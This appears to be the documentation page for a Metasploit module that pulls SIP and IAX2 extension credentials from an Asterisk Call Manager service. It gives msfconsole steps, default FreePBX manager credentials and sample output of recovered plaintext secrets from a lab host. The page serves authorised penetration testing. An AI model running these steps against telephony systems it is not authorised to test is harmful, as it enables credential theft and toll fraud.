## Description

  This module retrieves SIP and IAX2 user extensions and credentials from Asterisk Call Manager service.

  Valid manager credentials are required.


## Vulnerable Application

  [Asterisk](http://www.asterisk.org/get-started/features) offers both classical PBX functionality and advanced features, and interoperates with traditional standards-based telephony systems and Voice over IP systems.

  This module has been tested successfully on:

  * Asterisk Call Manager version 2.10.0 on Asterisk 13.16.0
  * Asterisk Call Manager version 1.1 on Asterisk 1.6.2.11

  The following software comes with Asterisk preinstalled and can be used for testing purposes:

  * [FreePBX](https://www.freepbx.org/downloads/)
  * [VulnVoIP](https://www.rebootuser.com/?p=1069)

  Note that Asterisk will reject valid authentication credentials when connecting from a network that has not been permitted using the `permit` directive (or is specifically denied in the `deny` directive) in the Asterisk manager configuration file `/etc/asterisk/manager.conf`.


## Verification Steps

  1. Start `msfconsole`
  2. Do: `use auxiliary/gather/asterisk_creds`
  3. Do: `set rhost <RHOST>`
  4. Do: `set rport <RPORT>` (default: `5038`)
  5. Do: `set username <USERNAME>` (default: `admin`)
  6. Do: `set password <PASSWORD>` (default: `amp111`)
  7. Do: `run`
  8. You should get credentials


## Scenarios

  ```
  [*] 172.16.191.229:5038 - Found Asterisk Call Manager version 2.10.0
  [+] 172.16.191.229:5038 - Authenticated successfully
  [*] 172.16.191.229:5038 - Found 9 users

  Asterisk User Credentials
  =========================

   Username  Secret                Type
   --------  ------                ----
   100                             sip
   103       bbf5d449753391a       sip
   104       273db6cd9ca402f53354  iax2
   105       secret password       sip
   106       "_" ;)                iax2
   107       123456789             sip
   108       ~!@#$%^&*()_+{}       sip
   109       antidisestablishment  iax2
   123       y2u.be/VOaZbaPzdsk    iax2

  [+] 172.16.191.229:5038 - Credentials saved in: /root/.msf4/loot/20170723052316_default_172.16.191.229_asterisk.user.cr_798166.txt
  [*] Auxiliary module execution completed
  ```

